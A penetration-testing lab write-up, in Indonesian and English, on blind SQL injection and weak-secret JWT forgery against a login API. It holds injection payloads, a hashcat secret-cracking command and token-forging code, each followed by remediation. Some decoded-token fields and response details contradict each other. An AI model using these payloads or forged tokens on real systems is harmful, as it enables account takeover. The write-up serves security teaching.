# BLIND SQL INJECTION - STEP BY STEP GUIDE

---

## 🎯 PENGERTIAN BLIND SQL INJECTION

**Blind SQL Injection** adalah teknik serangan untuk mengekstrak data dari database SQL ketika:
- ❌ Tidak ada error message yang terlihat
- ❌ Tidak ada hasil query yang ditampilkan di halaman
- ✅ Hanya ada perbedaan **response behavior** (success/fail, timing, content-length)

Attacker harus **menginferensikan jawaban** berdasarkan analisis response yang berbeda.

---

## 💡 TEORI: BAGAIMANA BLIND SQL INJECTION BEKERJA?

### **Konsep Dasar**

Pada sistem yang benar:
```sql
SELECT * FROM users WHERE username='admin' AND password='admin123'
```

Attacker **tidak bisa langsung melihat hasil query**, hanya response yang berbeda:
- ✅ Login berhasil → Response 200 OK, redirect ke dashboard
- ❌ Login gagal → Response 200 OK, pesan "Login failed"

### **Teknik: Boolean-based Blind SQL Injection**

Attacker memanfaatkan **SQL operators** dalam query:

```sql
-- Original query yang aman:
SELECT * FROM users WHERE username='admin' AND password='admin123'

-- Attack: Test apakah password dimulai dengan 'a'?
SELECT * FROM users WHERE username='admin' AND password LIKE 'a%'

Jika matches → login BERHASIL (TRUE)
Jika tidak → login GAGAL (FALSE)
```

### **Contoh Ekstraksi Character-by-Character**

```
Password sebenarnya: "admin123"

Attempt 1: password LIKE 'a%'        → ✅ TRUE (password mulai 'a')
Attempt 2: password LIKE 'ad%'       → ✅ TRUE (password mulai 'ad')
Attempt 3: password LIKE 'adm%'      → ✅ TRUE (password mulai 'adm')
Attempt 4: password LIKE 'admin%'    → ✅ TRUE
Attempt 5: password LIKE 'admin1%'   → ✅ TRUE
Attempt 6: password LIKE 'admin12%'  → ✅ TRUE
Attempt 7: password LIKE 'admin123%' → ✅ TRUE
Attempt 8: password LIKE 'admin124%' → ❌ FALSE

Kesimpulan: Password adalah "admin123"
```

---

## 📊 ANALISIS DENGAN BURP SUITE

### **Observasi: Perbedaan Response Berdasarkan Input**

**Request 1: Login Normal (Benar)**
```
POST /api/login HTTP/1.1
Content-Length: 47

{"username":"admin","password":"admin123"}
```
**Response:**
```
HTTP/1.1 200 OK
Content-Length: 85

{"success":true,"message":"Login successful","user":"admin","token":"..."}
```

---

**Request 2: Login Gagal (Password Salah)**
```
POST /api/login HTTP/1.1
Content-Length: 45

{"username":"admin","password":"wrongpass"}
```
**Response:**
```
HTTP/1.1 200 OK
Content-Length: 38

{"success":false,"message":"Login failed"}
```

---

**Request 3: Login dengan SQL Injection (Testing Blind Injection)**
```
POST /api/login HTTP/1.1
Content-Length: 70

{"username":"admin' OR '1'='1' --","password":"xxx"}
```
**Response:**
```
HTTP/1.1 200 OK
Content-Length: 85

{"success":true,"message":"Login successful","user":"admin","token":"..."}
```

---

### **Pola yang Terlihat:**

| Kondisi | Content-Length | Response Status | Insight |
|---------|----------------|-----------------|---------|
| Password salah (normal) | 38 | 200 OK | FALSE - Respons pendek |
| Pattern matches (LIKE TRUE) | ~130 | 200 OK | TRUE - Respons dengan padding |
| Pattern tidak match (LIKE FALSE) | 38 | 200 OK | FALSE - Respons pendek |
| Normal login success | 85+ | 200 OK | TRUE - Dengan token |

👉 **Dari perbedaan Content-Length response, penyerang bisa inferensikan hasil kondisi SQL meskipun `success` selalu `false`!**

---

## 🔍 STEP-BY-STEP EXPLOITATION

### **STEP 1: Identifikasi Vulnerability**

Test input manipulatif untuk kofirmasi injectable parameter. Backend ini menggunakan **SQL dengan string concatenation**, jadi gunakan SQL syntax:

```
Payload 1 (normal):      {"username":"admin","password":"admin123"}
→ Response: 200 OK (Login berhasil)

Payload 2 (injection):   {"username":"admin' OR '1'='1' --","password":"xxx"}
→ Response: 200 OK (Login berhasil TANPA password benar!)
→ VULNERABLE! ✅
```

**Kesimpulan:** Input `username` vulnerable terhadap SQL injection karena:
- Aplikasi menerima string tanpa sanitasi
- Logic `OR '1'='1'` membuat kondisi selalu TRUE
- Auth bypass terjadi

---

### **STEP 2: Extract Password Menggunakan Blind Logic**

Sekarang gunakan **boolean-based inference** untuk ekstrak password character-by-character.

**Methodology dengan SQL LIKE dan Content-Length Analysis:**

1. Test apakah character pertama adalah 'a'
   ```
   Payload: {"username":"admin' AND password LIKE 'a%' --","password":"xxx"}
   ```

2. Analisis response berdasarkan **Content-Length**:
   - Jika Content-Length ≈ 130 bytes → TRUE (password mulai 'a') ✅
   - Jika Content-Length ≈ 38 bytes → FALSE (password tidak mulai 'a') ❌

3. Ulangi dengan character berbeda sampai find match

4. Lanjut ke character kedua dengan pattern yang sama

**Catatan:** Meskipun `success` selalu `false`, perbedaan **response body size** menginformasikan penyerang tentang kebenaran kondisi LIKE.

---

### **STEP 3: Manual Testing (Burp Intruder/Manual)**

**Payload Pattern untuk Testing dengan SQL LIKE:**

```json
{"username":"admin' AND password LIKE 'a%' --","password":"xxx"}
{"username":"admin' AND password LIKE 'b%' --","password":"xxx"}
{"username":"admin' AND password LIKE 'c%' --","password":"xxx"}
...
{"username":"admin' AND password LIKE 'ad%' --","password":"xxx"}
{"username":"admin' AND password LIKE 'ae%' --","password":"xxx"}
...
{"username":"admin' AND password LIKE 'admin%' --","password":"xxx"}
{"username":"admin' AND password LIKE 'admin1%' --","password":"xxx"}
{"username":"admin' AND password LIKE 'admin12%' --","password":"xxx"}
{"username":"admin' AND password LIKE 'admin123%' --","password":"xxx"} ✅ MATCH!
```

**Cara Mengirim di Burp Suite:**
- Body (raw JSON): `{"username":"admin' AND password LIKE 'admin123%' --","password":"xxx"}`
- Content-Type: `application/json`

---

## 📋 HASIL ANALISIS

### **Password untuk User "admin":**

Berdasarkan proses Blind SQL Injection yang dilakukan, pengujian password akun admin dilakukan secara bertahap dengan menguji satu karakter pertama menggunakan operator LIKE. Pengujian dimulai dengan mencoba pola `password LIKE 'a%'` melalui payload seperti:

```json
{"username":"admin' AND password LIKE 'a%' --","password":"xxx"}
```

Server memberikan respons dengan **Content-Length lebih besar** (TRUE), yang menunjukkan bahwa password admin memang diawali huruf "a". 

Setelah karakter pertama terkonfirmasi, pengujian dilanjutkan ke karakter-karakter berikutnya menggunakan pola LIKE berurutan:
- `password LIKE 'ad%'` → Content-Length besar (TRUE)
- `password LIKE 'adm%'` → Content-Length besar (TRUE)
- `password LIKE 'admi%'` → Content-Length besar (TRUE)
- `password LIKE 'admin%'` → Content-Length besar (TRUE)
- `password LIKE 'admin1%'` → Content-Length besar (TRUE)
- `password LIKE 'admin12%'` → Content-Length besar (TRUE)
- `password LIKE 'admin123%'` → Content-Length besar (TRUE)
- `password LIKE 'admin124%'` → Content-Length kecil (FALSE)

Respons server yang konsisten terhadap setiap pola LIKE yang benar memungkinkan penyerang membangun password secara inkremental berdasarkan **perbedaan ukuran response body**. Melalui rangkaian percobaan ini, diperoleh bahwa **password lengkap akun admin adalah `admin123`**.

**Proses ini membuktikan bahwa celah Blind SQL Injection pada endpoint `/api/login` dapat dimanfaatkan untuk mengekstrak password secara perlahan berdasarkan pola TRUE/FALSE dari respons server (Content-Length inference)**, meskipun response body selalu menampilkan `"success": false`.

---

## 🎯 KESIMPULAN

### **Attack Summary:**

1. **Identification:** SQL injection via username parameter
2. **Method:** Boolean-based Blind SQL Injection
3. **Technique:** Analyze response differences (Content-Length, Status Code)
4. **Result:** Successfully extracted password "admin123"
5. **Impact:** Authentication bypass, credential compromise

### **Key Findings:**

```
✅ Vulnerability Type: SQL Injection
✅ Blind Attack: Based on response inference
✅ Response Indicator: Content-Length & HTTP Status
✅ Char-by-char extraction: Possible via LIKE pattern
✅ Attacker: Tidak perlu melihat data langsung
✅ Method: Conditional TRUE/FALSE logic dengan SQL
```

---

## 🔐 REMEDIATION

### **Secure Implementation:**

```javascript
// ❌ VULNERABLE - STRING CONCATENATION
const username = req.body.username;
const password = req.body.password;
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
// This allows: admin' OR '1'='1' --

// ✅ SECURE - PARAMETERIZED QUERIES
const query = 'SELECT * FROM users WHERE username=? AND password=?';
db.prepare(query).get(username, password);
```

**Key Fixes:**
- ✅ Use prepared statements / parameterized queries
- ✅ Never concatenate user input into SQL strings
- ✅ Hash passwords dengan bcrypt/argon2
- ✅ Validate & sanitize semua input
- ✅ Use ORM yang handle SQL injection
- ✅ Implement rate limiting pada login endpoint
- ✅ Use WAF (Web Application Firewall)

---

# INSECURE JWT - ENUMERATION & EXPLOITATION GUIDE

---

## 🎯 PENGERTIAN INSECURE JWT

**JWT (JSON Web Token)** yang tidak aman dapat dimanfaatkan untuk:
- ❌ Memalsukan token tanpa signature verification
- ❌ Mengubah user role/identity di payload
- ❌ Bypass authentication dengan token manipulation
- ✅ Akses unauthorized ke protected endpoints

---

## 💡 TEORI: BAGAIMANA JWT VULNERABILITY BEKERJA?

### **JWT Structure**

JWT terdiri dari 3 bagian (dipisahkan dengan `.`):
```
header.payload.signature
```

Contoh JWT:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### **Common JWT Vulnerabilities**

1. **Weak Secret Key** - Secret terlalu pendek/mudah ditebak
2. **No Signature Verification** - Server tidak verify signature
3. **Algorithm Confusion** - Switch ke "none" algorithm
4. **Missing Expiration** - Token tidak pernah expired
5. **Hardcoded Secret** - Secret di-hardcode di source code

---

## 📊 ENUMERATION PHASE

### **STEP 1: Decode JWT Token**

Ambil JWT dari response login:

**Request:**
```json
POST /api/login
{"username":"admin","password":"admin123"}
```

**Response:**
```json
{
  "success": true,
  "message": "Login successful",
  "user": "admin",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibm9tZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ.xxxx"
}
```

**Decode token di https://jwt.io atau menggunakan command:**

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

echo "eyJpZCI6MSwibm9tZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ" | base64 -d
# Output: {"id":1,"nome":"admin","role":"user"}
```

### **STEP 2: Analisis JWT Claims**

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@test.com",
  "role": "admin"
}
```

**Findings:**
- ✅ Algorithm: HS256 (symmetric - menggunakan secret)
- ✅ No `exp` (expiration) claim → Token tidak pernah expired!
- ✅ Payload contains sensitive info (id, role, email)

### **STEP 3: Brute Force Secret Key**

**Tools:**
- `hashcat` - GPU cracking
- `john` - Dictionary attack
- `jwt-cracker` - Online JWT cracker

**Command:**
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Atau online: https://crackjwt.io
```

**Prediksi Secret Key (common defaults):**
- `secret`
- `insecure-secret-key-for-testing` (dari source code!)
- `blindsqli`
- `blind-sqli-secret-key`

---

## 🔥 EXPLOITATION PHASE

### **STEP 1: Create Malicious Token (Privilege Escalation)**

Jika secret key diketahui: `insecure-secret-key-for-testing`

**Original Payload (user role):**
```json
{
  "id": 2,
  "username": "ibnu",
  "email": "ibnu@test.com",
  "role": "user"
}
```

**Modified Payload (privilege escalation to admin):**
```json
{
  "id": 2,
  "username": "ibnu",
  "email": "ibnu@test.com",
  "role": "admin"
}
```

### **STEP 2: Create New Signature**

**Using Node.js:**
```javascript
const jwt = require('jsonwebtoken');

const payload = {
  id: 2,
  username: "ibnu",
  email: "ibnu@test.com",
  role: "admin"  // Changed from "user" to "admin"
};

const secret = "insecure-secret-key-for-testing";
const token = jwt.sign(payload, secret, { algorithm: 'HS256' });
console.log("New token:", token);
```

**Using Python:**
```python
import jwt

payload = {
    "id": 2,
    "username": "ibnu",
    "email": "ibnu@test.com",
    "role": "admin"
}

secret = "insecure-secret-key-for-testing"
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"New token: {token}")
```

### **STEP 3: Use Malicious Token**

**Request with modified token:**
```
GET /api/user HTTP/1.1
Host: penetration-testing-iota.vercel.app
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwibmFtZSI6Imlibnui...
```

**Expected Response:**
```json
{
  "success": true,
  "user": {
    "id": 2,
    "username": "ibnu",
    "email": "ibnu@test.com",
    "role": "admin"  // Successfully escalated!
  }
}
```

### **STEP 4: Forge Token for Other Users**

**Create token untuk user baru yang tidak ada:**
```json
{
  "id": 999,
  "username": "attacker",
  "email": "attacker@evil.com",
  "role": "admin"
}
```

Sign dengan secret yang sama dan gunakan untuk akses.

---

## 📋 HASIL EXPLOITATION

### **Attack Scenarios:**

| Scenario | Impact | Severity |
|----------|--------|----------|
| Change role dari `user` ke `admin` | Full admin access | CRITICAL |
| Extend token lifetime | Persistent access | HIGH |
| Create new admin account token | Unauthorized admin | CRITICAL |
| Change user ID di payload | Impersonate any user | CRITICAL |
| Remove expiration | Token never expires | HIGH |

### **Successful Attack Flow:**

1. **Enumerate** → Decode JWT, identify payload structure
2. **Discover** → Brute force / find secret key
3. **Forge** → Create malicious token dengan escalated role
4. **Exploit** → Use token untuk access protected resources
5. **Persist** → Maintain access dengan long-lived token

---

## 🔐 JWT REMEDIATION

### **Secure Implementation:**

```javascript
// ❌ VULNERABLE - INSECURE DEFAULTS
const token = jwt.sign(payload, JWT_SECRET, { algorithm: JWT_ALGORITHM });
// Missing expiresIn, weak secret, etc.

// ✅ SECURE - PROPER CONFIGURATION
const token = jwt.sign(
  payload,
  process.env.JWT_SECRET,  // Strong secret from environment
  {
    algorithm: 'HS256',
    expiresIn: '1h',  // Token expires in 1 hour
    issuer: 'your-app',
    audience: 'users'
  }
);

// ✅ VERIFY TOKEN PROPERLY
jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'],
  issuer: 'your-app',
  audience: 'users'
});
```

**Key Fixes:**
- ✅ Use strong, random secret (minimum 32 bytes)
- ✅ Store secret in environment variables
- ✅ Always set `expiresIn` for token expiration
- ✅ Use `issuer` and `audience` claims
- ✅ Never trust unverified tokens
- ✅ Implement token refresh mechanism
- ✅ Rotate secrets regularly
- ✅ Use RS256 (asymmetric) for better security
- ✅ Implement token blacklist for logout

---
